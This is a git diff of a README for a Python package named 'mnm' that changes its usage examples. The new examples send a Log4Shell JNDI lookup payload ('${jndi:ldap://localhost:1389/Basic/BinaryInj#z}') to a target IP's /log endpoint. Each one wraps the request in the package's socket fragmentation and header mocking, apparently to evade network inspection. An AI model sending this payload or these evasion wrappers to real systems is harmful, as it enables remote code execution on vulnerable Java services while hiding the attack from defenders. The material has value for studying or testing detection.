@@ -11,17 +11,29 @@ pip install mnm
 ## Usage
 
 ```python
-import mnm
-mnm.enable_socket_fragmentation()
-mnm.enable_header_mocking()
-
+from mnm import *
 import requests
-requests.get('http://example.com')
 
-mnm.disable_socket_fragmentation()
-mnm.disable_header_mocking()
+@mixed(SocketFragmentation(slice=5), HeaderMocking())
+def mixed_options(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
 
-requests.get('http://example.com')
+@mixed()
+def mixed_simple(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
+
+def with_pattern(ip):
+    with SocketFragmentation(slice=5), HeaderMocking():
+        r = requests.get(f'http://{ip}/log', data={
+            "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+        })
+        print(r.text)
 ```
 
 ## License
